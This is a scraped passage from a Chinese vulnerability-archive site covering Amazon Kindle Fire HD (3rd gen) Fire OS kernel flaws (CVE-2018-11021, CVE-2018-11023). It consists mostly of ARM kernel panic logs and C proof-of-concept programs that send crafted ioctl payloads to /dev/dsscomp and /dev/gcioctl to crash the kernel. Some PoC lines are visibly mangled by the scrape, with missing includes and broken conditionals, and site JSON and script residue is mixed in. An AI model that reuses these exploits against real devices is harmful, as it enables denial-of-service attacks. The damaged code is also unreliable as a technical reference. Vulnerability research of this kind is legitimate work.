omaplfb(O) pvrsrvkm(O) pvr_logger(O) [ 146.320983] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1) [ 146.328308] PC is at ion_free+0xc/0xb4 [ 146.332672] LR is at rpmsg_omx_ioctl+0x2cc/0x598 [ 146.337890] pc : [] lr : [] psr: 60000013 [ 146.337890] sp : c35b5e60 ip : c35b5e80 fp : c35b5e7c [ 146.350860] r10: c35b5ea8 r9 : de88c4d8 r8 : c35b4000 [ 146.356872] r7 : dd32b580 r6 : 00000003 r5 : d71d5880 r4 : be92f5f8 [ 146.364135] r3 : d71d58ec r2 : d71d58ec r1 : b5d18de2 r0 : d7aaaa00 [ 146.371551] Flags: nZCv IRQs on FIQs on Mode SVC_32 ISA ARM Segment user [ 146.379516] Control: 10c5387d Table: 972dc04a DAC: 00000015 [ 146.386077] [ 146.386077] PC: 0xc02e84c0: [ 146.391052] 84c0 0a000001 e2871010 ebfddc25 e1a00006 eb0ee904 e5953058 e2433001 e5853058 [ 146.401580] 84e0 e3530000 ba000011 1a000009 e1a0200d e3c23d7f e3c3303f e285005c e593300c [ 146.412292] 8500 e593723c e1a01007 ebf90a76 e597321c e585306c e1a00006 eb0ee876 e1a00005 [ 146.422821] 8520 ebffffb4 e1a00004 ebf8e011 e89da8f0 e7f001f2 e1a0c00d e92dd878 e24cb004 [ 146.433502] 8540 e5915004 e1a04001 e1550000 1a000021 e2856014 e1a00006 eb0ee8e2 e5953010 [ 146.444183] 8560 e3530000 0a000005 e243200c e1540002 2a00000a e5933008 e3530000 1afffff9 [ 146.454864] 8580 e59f0054 e3001219 e59f2050 e59f3050 ebf58268 e1a00006 eb0ee856 e89da878 [ 146.465393] 85a0 85933004 8affffed f57ff05f e1943f9f e2433001 e1842f93 e3320000 1afffffa [ 146.476074] [ 146.476074] LR: 0xc048a0a0: [ 146.481048] a0a0 33a03000 e3530000 1affffae e24ba05c e1a01004 e3a02008 e1a0000a ebf7305e [ 146.491729] a0c0 e3500000 1affffaa e5950068 e51b1058 ebf97677 e3500000 e50b005c 0a000001 [ 146.502380] a0e0 e3700a01 9affffc8 e3a03000 e50b305c eaffffc5 e3e00018 eaffff8e e1a00004 [ 146.513061] a100 e1a0100a e3a02008 ebf73154 e3500000 0affff88 eaffffc2 e5950068 ebf97904 [ 146.523590] a120 eaffffb9 e24b005c e3a01030 ebf7398b e3a02030 e597003c e1a03006 e58d2000 [ 146.534240] a140 e59f1280 e59f2274 ebf99069 e3e0000d eaffff78 e5933004 e7933101 e3530000 [ 146.544921] a160 0affff6c e5950068 ebf97651 e2509000 0a000021 e3790a01 8a00001f e5950068 [ 146.555603] a180 e1a01009 e24b2064 e24b3060 ebf97447 e3500000 050b905c 0affff9b e59f322c [ 146.566131] [ 146.566131] SP: 0xc35b5de0: [ 146.571228] 5de0 00000004 d8cc50f4 60010013 00000001 00000001 c02e8540 60000013 ffffffff [ 146.581787] 5e00 c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2 [ 146.592437] 5e20 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 [ 146.603118] 5e40 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff [ 146.613830] 5e60 d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 [ 146.624389] 5e80 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 [ 146.635070] 5ea0 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 [ 146.645599] 5ec0 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 [ 146.656158] [ 146.656158] IP: 0xc35b5e00: [ 146.661254] 5e00 c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2 [ 146.671936] 5e20 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 [ 146.682495] 5e40 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff [ 146.693176] 5e60 d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 [ 146.703704] 5e80 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 [ 146.714263] 5ea0 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 [ 146.724914] 5ec0 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 [ 146.735595] 5ee0 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 [ 146.746276] [ 146.746276] FP: 0xc35b5dfc: [ 146.751251] 5dfc ffffffff c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 [ 146.761779] 5e1c b5d18de2 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 [ 146.772308] 5e3c de88c4d8 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 [ 146.783020] 5e5c ffffffff d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 [ 146.793701] 5e7c c02e8540 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 [ 146.804382] 5e9c c35b5ea8 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 [ 146.814941] 5ebc c35b5f14 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc [ 146.825592] 5edc 00000000 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 [ 146.836242] [ 146.836242] R0: 0xd7aaa980: [ 146.841217] a980 00000001 00000001 00000000 00000000 00004007 00000000 00000000 00000000 [ 146.851898] a9a0 00000020 00000000 00000000 00000000 00000300 d7aaa9b4 d7aaa9b4 c0248d00 [ 146.862518] a9c0 00000093 00000093 0000005d 00000002 00000000 00000000 00000000 00000000 [ 146.873077] a9e0 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 146.883728] aa00 d763b780 00000000 00000000 deabb480 00000000 00000001 00000000 00000000 [ 146.894409] aa20 d7aaaa20 d7aaaa20 00000000 00000105 c0903054 d7157440 00000f30 dcd4f220 [ 146.905090] aa40 00000093 00000003 00000017 00000000 00000000 00000000 00000000 00000000 [ 146.915618] aa60 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 146.926300] [ 146.926300] R2: 0xd71d586c: [ 146.931274] 586c 00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580 [ 146.941955] 588c d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000 [ 146.952636] 58ac d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000 [ 146.963287] 58cc 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00 [ 146.973815] 58ec d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904 [ 146.984497] 590c 00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000 [ 146.995147] 592c 00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000 [ 147.005676] 594c 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 147.016357] [ 147.016357] R3: 0xd71d586c: [ 147.021453] 586c 00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580 [ 147.032012] 588c d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000 [ 147.042663] 58ac d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000 [ 147.053314] 58cc 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00 [ 147.063873] 58ec d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904 [ 147.074523] 590c 00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000 [ 147.085205] 592c 00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000 [ 147.095886] 594c 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 147.106414] [ 147.106445] R5: 0xd71d5800: [ 147.111541] 5800 d71d5d00 00000000 00000000 dcfc4200 f0000009 00000211 00000001 00000001 [ 147.122070] 5820 00000000 00001000 00001000 00000004 00000000 d71d5844 c01519dc d89b54c0 [ 147.132751] 5840 c01576ac c10dc870 00001000 00000000 c0a10230 c0a10dc0 d1a1dd58 c006f724 [ 147.143432] 5860 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 [ 147.154083] 5880 dd32b5c8 dd32b5c8 dd32b580 d71d588c d71d588c 00000000 00000000 00000000 [ 147.164611] 58a0 00000001 00000000 00000000 d71d58ac d71d58ac 00000000 00000000 00000000 [ 147.175140] 58c0 d71d58c0 d71d58c0 00000000 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 [ 147.185821] 58e0 00000000 00000000 d7aaaa00 d71d58ec d71d58ec 00000000 00000000 00000000 [ 147.196472] [ 147.196502] R7: 0xdd32b500: [ 147.201446] b500 e2401000 f400f000 0202420f 0000c000 f400f000 dd071d20 00000000 d8f0a680 [ 147.212127] b520 d8f0a740 00000000 00000000 00000001 00000000 00000000 00000000 00000000 [ 147.222656] b540 00000000 00000000 00000001 00000000 00000000 00000000 00000000 00000000 [ 147.233184] b560 00000000 00000000 c153f430 00001000 00000000 00000000 00000000 00000000 [ 147.243865] b580 00000000 dd32b584 dd32b584 00000000 00000000 c0a16c60 00000000 00000002 [ 147.254547] b5a0 00000001 00000000 c06faab0 de88c61c de88c61c 0f700001 00000001 d8caa000 [ 147.265075] b5c0 dd0f7200 00000001 d71d5880 d71d5880 00000001 00000000 00000000 dd32b5dc [ 147.275756] b5e0 dd32b5dc 00000000 7fffffff 00000000 00000000 dd32b5f4 dd32b5f4 00000000 [ 147.286407] [ 147.286407] R8: 0xc35b3f80: [ 147.291381] 3f80 66eff968 00000000 000000f0 c0013e08 c35b2000 00000000 00000000 c35b3fa8 [ 147.302032] 3fa0 c0013c60 c009a164 66eff978 66eff968 66eff978 00000080 00000000 00000000 [ 147.312713] 3fc0 66eff978 66eff968 00000000 000000f0 00000000 00000000 00000000 41d1f6a8 [ 147.323272] 3fe0 00000000 6716ebc8 400710f8 40083b80 600f0010 66eff978 00760061 00000061 [ 147.333923] 4000 00000000 00000002 00000000 d7157440 c0a0e840 00000000 00000015 d726ee00 [ 147.344604] 4020 d8d2c700 c35b4000 c09ddc50 d7157440 d8db57c0 c1617b40 c35b5b4c c35b5a98 [ 147.355133] 4040 c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000 [ 147.365814] 4060 0087d4c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000 [ 147.376464] [ 147.376495] R9: 0xde88c458: [ 147.381469] c458 de88c458 de88c458 00000000 00000000 00000000 c06bc674 000200da c09dda58 [ 147.392150] c478 00000000 00000000 de88c480 de88c480 00000000 de88c48c de88c48c 00000000 [ 147.402801] c498 5aefcde6 00000000 00000000 00000000 de88c4b0 28cfd730 00000000 00000000 [ 147.413330] c4b8 00200000 00000000 00000000 de88c4c4 de88c4c4 d8cbdf00 d8cbdf00 00000000 [ 147.424011] c4d8 000521b0 00000402 00000402 00000000 00000000 00000000 c06b9600 dd160400 [ 147.434661] c4f8 de88c5b0 d8c81030 00000f98 00000001 0f700001 5aefcde6 199c82ca 5aefcde6 [ 147.445312] c518 199c82ca 5aefcde6 199c82ca 00000000 00000000 00000000 00000000 00000000 [ 147.455871] c538 00000000 00000000 00000000 00000000 00000001 00000000 00000000 de88c554 [ 147.466522] [ 147.466522] R10: 0xc35b5e28: [ 147.471588] 5e28 be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 c35b5ea8 c35b5e7c [ 147.482269] 5e48 c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff d71d58ec be92f5f8 [ 147.492950] 5e68 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 c35b5edc c35b5e90 [ 147.503631] 5e88 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 c00723a0 000fffff [ 147.514160] 5ea8 b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 00000000 00000001 [ 147.524688] 5ec8 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 d72400c0 00000004 [ 147.535339] 5ee8 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 c0136044 c0489e60 [ 147.546020] 5f08 00000000 00000000 00000000 00000001 00000000 dd055190 dd5e7f68 c35b5f0c [ 147.556579] Process rpmsg_omx_ioctl (pid: 3888, stack limit = 0xc35b42f8) [ 147.564270] Stack: (0xc35b5e60 to 0xc35b6000) [ 147.569213] 5e60: d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540 [ 147.578430] 5e80: c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8 [ 147.587646] 5ea0: c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14 [ 147.596740] 5ec0: 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000 [ 147.605957] 5ee0: d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08 [ 147.615173] 5f00: c0136044 c0489e60 00000000 00000000 00000000 00000001 00000000 dd055190 [ 147.624389] 5f20: dd5e7f68 c35b5f0c c35b4000 be92f628 be92f5f8 c0085803 d72400c0 00000004 [ 147.633483] 5f40: c35b4000 00000000 c35b5f64 00000000 be92f5f8 c0085803 d72400c0 00000004 [ 147.642730] 5f60: c35b4000 00000000 c35b5fa4 c35b5f78 c01365e0 c0135fc4 00000000 00000000 [ 147.651947] 5f80: 00000400 be92f628 00010e54 00000000 00000036 c0013e08 00000000 c35b5fa8 [ 147.661010] 5fa0: c0013c60 c0136578 be92f628 00010e54 00000004 c0085803 be92f5f8 be92f5f8 [ 147.670104] 5fc0: be92f628 00010e54 00000000 00000036 00000000 00000000 00000000 be92f614 [ 147.679321] 5fe0: 00000000 be92f5dc 00010690 0002917c 60000010 00000004 00000017 579e6e78 [ 147.688537] Backtrace: [ 147.691558] [] (ion_free+0x0/0xb4) from [] (rpmsg_omx_ioctl+0x2cc/0x598) [ 147.701049] r6:00000003 r5:d71d5880 r4:be92f5f8 r3:d71d58ec [ 147.708068] [] (rpmsg_omx_ioctl+0x0/0x598) from [] (do_vfs_ioctl+0x8c/0x5b4) [ 147.717956] [] (do_vfs_ioctl+0x0/0x5b4) from [] (sys_ioctl+0x74/0x84) [ 147.727203] [] (sys_ioctl+0x0/0x84) from [] (ret_fast_syscall+0x0/0x30) [ 147.736450] r8:c0013e08 r7:00000036 r6:00000000 r5:00010e54 r4:be92f628 [ 147.744873] Code: e7f001f2 e1a0c00d e92dd878 e24cb004 (e5915004) [ 147.754913] Board Information: [ 147.754913] Revision : 0001 [ 147.754943] Serial : 0000000000000000 [ 147.754943] SoC Information: [ 147.754943] CPU : OMAP4470 [ 147.754943] Rev : ES1.0 [ 147.754974] Type : HS [ 147.754974] Production ID: 0002B975-000000CC [ 147.754974] Die ID : 1CC60000-50002FFF-0B00935D-11007004 [ 147.755004] [ 147.794616] ---[ end trace 50912198cfc81720 ]--- [ 147.799957] Kernel panic - not syncing: Fatal exception [ 147.805847] CPU0: stopping [ 147.808959] Backtrace: [ 147.812133] [] (dump_backtrace+0x0/0x10c) from [] (dump_stack+0x18/0x1c) [ 147.821502] r6:c09ddc50 r5:c09dc844 r4:00000000 r3:c0a0e950 [ 147.828643] [] (dump_stack+0x0/0x1c) from [] (handle_IPI+0x190/0x1c4) [ 147.837860] [] (handle_IPI+0x0/0x1c4) from [] (gic_handle_irq+0x58/0x60) [ 147.847259] [] (gic_handle_irq+0x0/0x60) from [] (__irq_svc+0x40/0x70) [ 147.856567] Exception stack(0xdd187b38 to 0xdd187b80) [ 147.862243] 7b20: 00000002 00000002 [ 147.871459] 7b40: 00000002 00000001 dd187bbc c1621100 c1621100 00c6a000 c1621108 00000001 [ 147.880676] 7b60: 00000001 dd187bac 00000002 dd187b80 c002398c c009ae48 200d0013 ffffffff [ 147.889892] r6:ffffffff r5:200d0013 r4:c009ae48 r3:c002398c [ 147.896911] [] (generic_exec_single+0x0/0x98) from [] (smp_call_function_single+0x110/0x1e0) [ 147.908325] [] (smp_call_function_single+0x0/0x1e0) from [] (smp_call_function_many+0x244/0x294) [ 147.920104] [] (smp_call_function_many+0x0/0x294) from [] (smp_call_function+0x48/0x74) [ 147.931030] [] (smp_call_function+0x0/0x74) from [] (cpuidle_latency_notify+0x20/0x28) [ 147.941864] r4:ffffffff r3:c04310d4 [ 147.946258] [] (cpuidle_latency_notify+0x0/0x28) from [] (notifier_call_chain+0x4c/0x8c) [ 147.957305] [] (notifier_call_chain+0x0/0x8c) from [] (__blocking_notifier_call_chain+0x50/0x68) [ 147.969085] r8:200d0013 r7:000000a0 r6:00000000 r5:ffffffff r4:c0a11df8 [ 147.977020] r3:ffffffff [ 147.980499] [] (__blocking_notifier_call_chain+0x0/0x68) from [] (blocking_notifier_call_chain+0x20/0x28) [ 147.993133] r7:de95183c r6:000000a0 r5:0000115c r4:c0a11d98 [ 148.000152] [] (blocking_notifier_call_chain+0x0/0x28) from [] (pm_qos_update_target+0xf8/0x19c) [ 148.011932] [] (pm_qos_update_target+0x0/0x19c) from [] (pm_qos_update_request+0x5c/0x8c) [ 148.023071] [] (pm_qos_update_request+0x0/0x8c) from [] (omap_i2c_xfer+0x2bc/0x6c8) [ 148.033599] r5:dd187da0 r4:00000000 [ 148.038024] [] (omap_i2c_xfer+0x0/0x6c8) from [] (i2c_transfer+0xb8/0xf8) [ 148.047637] [] (i2c_transfer+0x0/0xf8) from [] (i2c_smbus_xfer+0x278/0x588) [ 148.057434] [] (i2c_smbus_xfer+0x0/0x588) from [] (i2c_smbus_read_word_data+0x3c/0x4c) [ 148.068267] [] (i2c_smbus_read_word_data+0x0/0x4c) from [] (bq27541_i2c_read.constprop.7+0x20/0x54) [ 148.080200] [] (bq27541_i2c_read.constprop.7+0x0/0x54) from [] (battery_handle_work+0x120/0x6a4) [ 148.091857] r5:dd187e92 r4:dd08b920 [ 148.096374] [] (battery_handle_work+0x0/0x6a4) from [] (process_one_work+0x150/0x468) [ 148.107116] [] (process_one_work+0x0/0x468) from [] (worker_thread+0x13c/0x320) [ 148.117156] [] (worker_thread+0x0/0x320) from [] (kthread+0x90/0x9c) [ 148.126312] [] (kthread+0x0/0x9c) from [] (do_exit+0x0/0x7e0) [ 148.134765] r6:c004cd64 r5:c0068a64 r4:dd0aded4 [ 148.140533] CPU0 PC (0) : 0xc0019b2c [ 148.144714] CPU0 PC (1) : 0xc0019b2c [ 148.148773] CPU0 PC (2) : 0xc0019b2c [ 148.152832] CPU0 PC (3) : 0xc0019b2c [ 148.156890] CPU0 PC (4) : 0xc0019b2c [ 148.161071] CPU0 PC (5) : 0xc0019b2c [ 148.165130] CPU0 PC (6) : 0xc0019b2c [ 148.169189] CPU0 PC (7) : 0xc0019b2c [ 148.173370] CPU0 PC (8) : 0xc0019b2c [ 148.177429] CPU0 PC (9) : 0xc0019b2c [ 148.181488] CPU1 PC (0) : 0xc003ee38 [ 148.185668] CPU1 PC (1) : 0xc003ee54 [ 148.189727] CPU1 PC (2) : 0xc003ee54 [ 148.193786] CPU1 PC (3) : 0xc003ee54 [ 148.197967] CPU1 PC (4) : 0xc003ee54 [ 148.202026] CPU1 PC (5) : 0xc003ee54 [ 148.206085] CPU1 PC (6) : 0xc003ee54 [ 148.210266] CPU1 PC (7) : 0xc003ee54 [ 148.214324] CPU1 PC (8) : 0xc003ee54 [ 148.218383] CPU1 PC (9) : 0xc003ee54 [ 148.222442] [ 148.224365] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017 [ 148.224365] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:14:29 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Amazon Kindle Fire HD/CVE-2018-11021.html":{"url":"iot/Amazon Kindle Fire HD/CVE-2018-11021.html","title":"（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","keywords":"","body":"（CVE-2018-11021）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/video/omap2/dsscomp/device.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ dsscomp与命令1118064517并导致内核崩溃。 要探索此漏洞，必须打开设备文件/ dev / dsscomp，并使用命令1118064517和精心设计的有效负载作为第三个参数在此设备文件上调用ioctl系统调用。 二、漏洞影响 Fire OS 4.5.5.3 三、复现过程 poc /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/dsscomp causes the system crash via IOCTL 1118064517. * Related buggy struct name is dsscomp_setup_dispc_data. * This Poc should run with permission to do ioctl on /dev/dsscomp. * */ #include #include #include #include const static char *driver = \"/dev/dsscomp\"; static command = 1118064517; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0xffffffff, 0x00000003, 0x5d200040, 0x79900008, 0x8f5928bd, 0x78b02422, 0x00000000, 0xffffffff, 0xf4c50400, 0x007fffff, 0x8499f562, 0xffff0400, 0x001b131d, 0x60818210, 0x00000007, 0xffffffff, 0x00000000, 0x9da9041c, 0xcd980400, 0x001f03f4, 0x00000007, 0x2a34003f, 0x7c80d8f3, 0x63102627, 0xc73643a8, 0xa28f0665, 0x00000000, 0x689e57b4, 0x01ff0008, 0x5e7324b1, 0xae3b003f, 0x0b174d86, 0x00000400, 0x21ffff37, 0xceb367a4, 0x00000040, 0x00000001, 0xec000f9e, 0x00000001, 0x000001ff, 0x00000000, 0x00000000, 0x0000000f, 0x0425c069, 0x038cc3be, 0x0000000f, 0x00000080, 0xe5790100, 0x5b1bffff, 0x0000d355, 0x0000c685, 0xa0070000, 0x0010ffff, 0x00a0ff00, 0x00000001, 0xff490700, 0x0832ad03, 0x00000006, 0x00000002, 0x00000001, 0x81f871c0, 0x738019cb, 0xbf47ffff, 0x00000040, 0x00000001, 0x7f190f33, 0x00000001, 0x8295769b, 0x0000003f, 0x869f2295, 0xffffffff, 0xd673914f, 0x05055800, 0xed69b7d5, 0x00000000, 0x0107ebbd, 0xd214af8d, 0xffff4a93, 0x26450008, 0x58df0000, 0xd16db084, 0x03ff30dd, 0x00000001, 0x209aff3b, 0xe7850800, 0x00000002, 0x30da815c, 0x426f5105, 0x0de109d7, 0x2c1a65fc, 0xfcb3d75f, 0x00000000, 0x00000001, 0x8066be5b, 0x00000002, 0xffffffff, 0x5cf232ec, 0x680d1469, 0x00000001, 0x00000020, 0xffffffff, 0x00000400, 0xd1d12be8, 0x02010200, 0x01ffc16f, 0xf6e237e6, 0x007f0000, 0x01ff08f8, 0x000f00f9, 0xbad07695, 0x00000000, 0xbaff0000, 0x24040040, 0x00000006, 0x00000004, 0x00000000, 0xbc2e9242, 0x009f5f08, 0x00800000, 0x00000000, 0x00000001, 0xff8800ff, 0x00000001, 0x00000000, 0x000003f4, 0x6faa8472, 0x00000400, 0xec857dd5, 0x00000000, 0x00000040, 0xffffffff, 0x3f004874, 0x0000b77a, 0xec9acb95, 0xfacc0001, 0xffff0001, 0x0080ffff, 0x3600ff03, 0x00000001, 0x8fff7d7f, 0x6b87075a, 0x00000000, 0x41414141, 0x41414141, 0x41414141, 0x41414141, 0x001001ff, 0x00000000, 0x00000001, 0xff1f0512, 0x00000001, 0x51e32167, 0xc18c55cc, 0x00000000, 0xffffffff, 0xb4aaf12b, 0x86edfdbd, 0x00000010, 0x0000003f, 0xabff7b00, 0xffff9ea3, 0xb28e0040, 0x000fffff, 0x458603f4, 0xffff007f, 0xa9030f02, 0x00000001, 0x002cffff, 0x9e00cdff, 0x00000004, 0x41414141, 0x41414141, 0x41414141, 0x41414141 }; int fd = 0; fd = open(driver, O_RDWR); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try open %s with command 0x%x.\\n\", driver, command); printf(\"System will crash and reboot.\\n\"); if(ioctl(fd, command, &payload) /data/local/tmp/log\"); return -1; } close(fd); return 0; } 崩溃日志 To be added here. 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-04 15:10:09 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"iot/Amazon Kindle Fire HD/CVE-2018-11023.html":{"url":"iot/Amazon Kindle Fire HD/CVE-2018-11023.html","title":"（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞","keywords":"","body":"（CVE-2018-11023）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞 一、漏洞简介 Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3的内核组件中的内核模块/omap/drivers/misc/gcx/gcioctl/gcif.c允许攻击者通过设备/ dev上ioctl的参数注入特制参数/ gcioctl使用命令3222560159，并导致内核崩溃。 二、漏洞影响 Fire OS 4.5.5.3 三、复现过程 poc /* * This is poc of Kindle Fire HD 3rd * A bug in the ioctl interface of device file /dev/gcioctl causes the system crash via IOCTL 3222560159. * This Poc should run with permission to do ioctl on /dev/gcioctl. * */ #include #include #include #include const static char *driver = \"/dev/gcioctl\"; static command = 3222560159; int main(int argc, char **argv, char **env) { unsigned int payload[] = { 0x244085aa, 0x1a03e6ef, 0x000003f4, 0x00000000 }; int fd = 0; fd = open(driver, O_RDONLY); if (fd /data/local/tmp/log\"); return -1; } printf(\"Try open %s with command 0x%x.\\n\", driver, command); printf(\"System will crash and reboot.\\n\"); if(ioctl(fd, command, &payload) /data/local/tmp/log\"); return -1; } close(fd); return 0; } 崩溃日志 [ 79.825592] init: untracked pid 3232 exited [ 79.830841] init: untracked pid 3234 exited [ 95.970855] Alignment trap: not handling instruction e1953f9f at [] [ 95.978912] Unhandled fault: alignment exception (0x001) at 0x1a03e6f3 [ 95.986053] Internal error: : 1 [#1] PREEMPT SMP ARM [ 95.991638] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O) [ 95.999145] CPU: 0 Tainted: G O (3.4.83-gd2afc0bae69 #1) [ 96.006408] PC is at __raw_spin_lock_irqsave+0x38/0xb0 [ 96.012115] LR is at _raw_spin_lock_irqsave+0x10/0x14 [ 96.017791] pc : [] lr : [] psr: 20000093 [ 96.017822] sp : d02bfdd8 ip : d02bfdf8 fp : d02bfdf4 [ 96.030578] r10: 00000000 r9 : dd3eeca8 r8 : 00000001 [ 96.036376] r7 : 1a03e6ef r6 : 00000001 r5 : 1a03e6f3 r4 : d02be000 [ 96.043701] r3 : 00000001 r2 : 00000001 r1 : 00000082 r0 : 20000013 [ 96.050933] Flags: nzCv IRQs off FIQs on Mode SVC_32 ISA ARM Segment user [ 96.058990] Control: 10c5387d Table: 96cb804a DAC: 00000015 [ 96.065460] [ 96.065460] PC: 0xc06a4d08: [ 96.070404] 4d08 1a000003 eaffffe6 e5903000 e3530000 0affffe3 e5903004 e3530000 1afffff9 [ 96.080810] 4d28 eaffffdf e50b0018 ebfffbab e51b0018 eaffffed e1a0c00d e92dd800 e24cb004 [ 96.091217] 4d48 ebffffcf e89da800 e1a0c00d e92dd878 e24cb004 e1a0300d e3c34d7f e3c4403f [ 96.101776] 4d68 e1a05000 e3a06001 e5943004 e2833001 e5843004 e10f0000 f10c0080 e1953f9f [ 96.112335] 4d88 e3330000 01853f96 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 [ 96.122894] 4da8 e5943000 e3130002 1a000010 e5953004 e3530000 e5953000 05856004 e3530000 [ 96.133361] 4dc8 1a000003 eaffffe7 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 [ 96.143920] 4de8 eaffffe0 f57ff05f e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 [ 96.154479] [ 96.154479] LR: 0xc06a4d90: [ 96.159393] 4d90 e3530000 0a000014 e121f000 e5943004 e2433001 e5843004 e5943000 e3130002 [ 96.170013] 4db0 1a000010 e5953004 e3530000 e5953000 05856004 e3530000 1a000003 eaffffe7 [ 96.180603] 4dd0 e5953000 e3530000 0affffe4 e5953004 e3530000 1afffff9 eaffffe0 f57ff05f [ 96.191070] 4df0 e5853004 e89da878 ebfffb79 eaffffec e1a0c00d e92dd800 e24cb004 ebffffcf [ 96.201690] 4e10 e89da800 e1a0c00d e92dd800 e24cb004 ebfffff6 e89da800 e1a0c00d e92dd800 [ 96.212341] 4e30 e24cb004 ebfffff1 e89da800 e1a0c00d e92dd818 e24cb004 ebffffc0 e1a04000 [ 96.222808] 4e50 ebe6a978 e121f004 e89da818 e1a0c00d e92dd800 e24cb004 ebfffff3 e89da800 [ 96.233612] 4e70 e1a0c00d e92dd830 e24cb004 e24dd008 e1a0300d e3c34d7f e3c4403f e3a05001 [ 96.244262] [ 96.244262] SP: 0xd02bfd58: [ 96.249145] fd58 00000000 0000001d 00000004 d4736f80 d4737394 c06a4d84 20000093 ffffffff [ 96.259948] fd78 d02bfdc4 